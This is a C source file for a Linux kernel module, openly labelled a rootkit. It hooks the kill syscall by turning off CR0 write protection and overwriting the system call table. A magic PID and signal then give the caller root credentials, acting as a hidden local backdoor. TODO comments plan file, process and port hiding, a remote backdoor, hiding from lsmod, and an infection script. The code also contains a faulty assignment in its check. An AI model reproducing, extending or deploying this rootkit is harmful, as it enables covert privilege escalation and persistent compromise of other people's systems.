#include <asm/unistd.h>    // for __NR_syscall
#include <linux/highmem.h> // for making the sys_call_table writable
#include <asm/current.h>
#include <linux/sched.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>

// TODO 
// Hide files, processes, and ports
// Remote backdoor
// Hide self from lsmod and other commands
// Rootkit should find the sys_call_table programmatically
// Bash script to automate infecting system

// for local backdoor
#define MAGIC_PID 31337
#define MAGIC_SIG 1337

// for writing to sys_call_table
#define GPF_DISABLE write_cr0(read_cr0() & (~ 0x10000))
#define GPF_ENABLE write_cr0(read_cr0() | 0x10000)

unsigned long *sys_call_table = (unsigned long*)0xc15b0000;  // hard coded, grep /boot/System.map
asmlinkage int (*orig_kill)(pid_t pid, int sig);

asmlinkage int hacked_kill(pid_t pid, int sig)
{
	int actual_result;
	if (pid = MAGIC_PID && sig == MAGIC_SIG) {
		struct cred *cred;
		cred = (struct cred *)__task_cred(current);
		cred->uid = 0;
		cred->gid = 0;
		cred->suid = 0;
		cred->sgid = 0;
		cred->euid = 0;
		cred->egid = 0;
		cred->fsuid = 0;
		cred->fsgid = 0;
		return 0;
	}

	actual_result = (*orig_kill)(pid,sig);
	return actual_result;
}

int make_writable(unsigned long add)
{
	unsigned int level;
	pte_t *pte = lookup_address(add,&level);
	if (pte->pte &~ _PAGE_RW)
		pte->pte = pte->pte | _PAGE_RW;
	return 0;
}

int make_write_protected(unsigned long add)
{
	unsigned int level;
	pte_t *pte = lookup_address(add,&level);
	pte->pte = pte->pte &~ _PAGE_RW;
	return 0;
}

int rootkit_init(void) {
	//make_writable((unsigned long)sys_call_table);
	GPF_DISABLE;
	orig_kill = sys_call_table[__NR_kill];
	sys_call_table[__NR_kill] = hacked_kill;
	//make_write_protected((unsigned long)sys_call_table);
	GPF_ENABLE;
	printk(KERN_INFO "Loading rootkit\n");
    	return 0;
}

void rootkit_exit(void) {
	//make_writable((unsigned long)sys_call_table);
	GPF_DISABLE;
	sys_call_table[__NR_kill] = orig_kill;
	//make_write_protected((unsigned long)sys_call_table);
	GPF_ENABLE;
	printk(KERN_INFO "Removing rootkit\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rootkit");
MODULE_AUTHOR("Josh Imhoff");
